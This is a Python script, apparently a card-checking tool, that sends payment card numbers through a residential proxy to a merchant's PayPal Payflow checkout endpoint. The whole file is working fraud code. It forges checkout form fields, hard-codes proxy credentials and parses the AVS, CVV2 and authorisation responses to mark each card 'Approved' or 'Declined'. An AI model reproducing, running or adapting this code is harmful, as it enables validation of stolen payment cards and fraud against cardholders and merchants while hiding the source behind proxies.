import aiohttp
import asyncio

username = "95wa9yh3c5-mobile.res-country-US-hold-query-session-66ebee49492f7"
password = "jm5JUBISFCkdMtWdF"
ip = "190.2.130.11"
puerto = "9999"
proxy = f"http://{username}:{password}@{ip}:{puerto}"

async def test(cc, mes, ano, cvv, url):
    connector = aiohttp.TCPConnector(ssl=False)  

    async with aiohttp.ClientSession(connector=connector) as session:
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': url,
            'priority': 'u=1, i',
            'referer': f'{url}/checkout',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = [
            ('form_key', '1XQlIIUKgJbidvLS'),
            ('captcha_form_id', 'payment_processing_request'),
            ('payment[method]', 'payflowpro'),
            ('billing-address-same-as-shipping', 'on'),
            ('captcha_form_id', 'co-payment-form'),
            ('orderAttributes[reason_for_purchase]', ''),
            ('orderAttributes[explanation_for_approver]', ''),
            ('controller', 'checkout_flow'),
            ('cc_type', 'VI'),
        ]

        async with session.post(
            f'{url}/paypal/transparent/requestSecureToken/',
            headers=headers,
            data=data,
            proxy=proxy  
        ) as response:
            result = await response.text()
            nonceid = result.split('"securetokenid":"')[1].split('"')[0]
            noncetoken = result.split('"securetoken":"')[1].split('"')[0]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': url,
            'priority': 'u=0, i',
            'referer': url,
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

        data = {
            'result': '0',
            'securetoken': noncetoken,
            'securetokenid': nonceid,
            'respmsg': 'Approved',
            'result_code': '0',
            'expdate': f"{mes}{ano[-2:]}",  
            'acct': cc,
        }

        async with session.post('https://payflowlink.paypal.com/', headers=headers, data=data, proxy=proxy) as response:
            text = await response.text()

            try:
                avsdata = text.split('type="hidden" name="AVSDATA" value="')[1].split('"')[0]
            except IndexError:
                avsdata = "none"

            try:
                cvv2match = text.split('type="hidden" name="PROCCVV2" value="')[1].split('"')[0]
            except IndexError:
                cvv2match = "none"

            try:
                respmsg = text.split('type="hidden" name="RESPMSG" value="')[1].split('"')[0]
            except IndexError:
                respmsg = "none"

            try:
                resptext = text.split('type="hidden" name="RESPTEXT" value="')[1].split('"')[0]
            except IndexError:
                resptext = "none"

            try:
                authcode = text.split('type="hidden" name="ASSOCIATIONRESPCODE" value="')[1].split('"')[0]
            except IndexError:
                authcode = "none"

            try:
                hostcode = text.split('type="hidden" name="HOSTCODE" value="')[1].split('"')[0]
            except IndexError:
                hostcode = "none"

            if ("APPROVAL" in resptext and "Verified" in respmsg) or ("NO REASN TO DECL" in resptext and "Verified" in respmsg):
                status = "Approved ✅"
            elif "CVV2 DECLINED" in resptext or "CVV2 Mismatch" in respmsg:
                status = "Declined ❌"
            elif "Funds" in resptext and respmsg:
                status = "Approved ✅"
            else:
                status = "Declined ❌"

    return avsdata, respmsg, cvv2match, authcode, resptext, hostcode, status 
